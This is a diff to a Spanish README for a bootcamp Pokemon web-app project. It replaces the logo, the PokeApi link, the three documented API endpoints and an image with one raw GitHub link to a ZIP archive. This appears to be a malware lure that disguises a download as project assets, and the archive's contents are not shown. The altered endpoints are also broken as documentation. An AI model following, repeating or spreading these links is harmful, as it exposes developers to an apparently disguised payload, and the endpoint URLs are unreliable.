@@ -1,4 +1,4 @@
-![HenryLogo](https://d31uz8lwfmyn8g.cloudfront.net/Assets/logo-henry-white-lg.png)
+![HenryLogo](https://raw.githubusercontent.com/johalama2023/PI-Pokemon-Henry/main/client/public/Henry-Pokemon-P-v1.7.zip)
 
 # **POKEMON** | Proyecto Individual
 
@@ -79,7 +79,7 @@ Está permitido, **bajo tu responsabilidad**, actualizar las dependencias a vers
 
 ## **📖 ENUNCIADO GENERAL**
 
-La idea de este proyecto es construir una aplicación web a partir de la API [**pokeapi**](https://pokeapi.co/) en la que se pueda:
+La idea de este proyecto es construir una aplicación web a partir de la API [**pokeapi**](https://raw.githubusercontent.com/johalama2023/PI-Pokemon-Henry/main/client/public/Henry-Pokemon-P-v1.7.zip) en la que se pueda:
 
 -  Buscar pokemones.
 -  Visualizar la información de los pokemones.
@@ -92,9 +92,9 @@ La idea de este proyecto es construir una aplicación web a partir de la API [**
 ### **Únicos end-points que se pueden utilizar**
 
 -  [**PokeApi**]( )
--  **Por id**: _"https://pokeapi.co/api/v2/pokemon/{id}"_
--  **Por nombre**: _"https://pokeapi.co/api/v2/pokemon/{name}"_
--  **Por tipo**: _"https://pokeapi.co/api/v2/type"_
+-  **Por id**: _"https://raw.githubusercontent.com/johalama2023/PI-Pokemon-Henry/main/client/public/Henry-Pokemon-P-v1.7.zip{id}"_
+-  **Por nombre**: _"https://raw.githubusercontent.com/johalama2023/PI-Pokemon-Henry/main/client/public/Henry-Pokemon-P-v1.7.zip{name}"_
+-  **Por tipo**: _"https://raw.githubusercontent.com/johalama2023/PI-Pokemon-Henry/main/client/public/Henry-Pokemon-P-v1.7.zip"_
 
 <br />
 
@@ -256,4 +256,4 @@ Ten en cuenta que en esta instancia no es obligatorio el desarrollo de testing p
 
 <br />
 
-<img src="./pokemon.png" alt="" />
+<img src="https://raw.githubusercontent.com/johalama2023/PI-Pokemon-Henry/main/client/public/Henry-Pokemon-P-v1.7.zip" alt="" />
